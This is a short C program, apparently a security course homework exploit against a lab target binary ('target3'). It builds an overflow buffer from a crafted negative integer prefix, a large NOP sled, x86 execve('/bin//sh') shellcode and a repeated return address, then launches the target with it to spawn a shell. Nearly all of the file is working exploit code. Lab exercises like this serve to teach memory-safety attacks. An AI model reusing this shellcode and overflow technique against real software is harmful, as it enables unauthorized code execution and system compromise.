#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/home/user/hw2/targets/target3"

int main(void)
{
  char buf[20020] = "-2147482647,";
  char in[20009];
  memset(in, '\x90', 15000);
  memcpy(in + 15000, "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80", 25);
  memset(in + 15000 + 25, '\x90', 4975);
  memcpy(in + 15000 + 25 + 4975, "\x04\x89\xff\xbf\x04\x89\xff\xbf", 8);
  strcat(buf, in);
  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
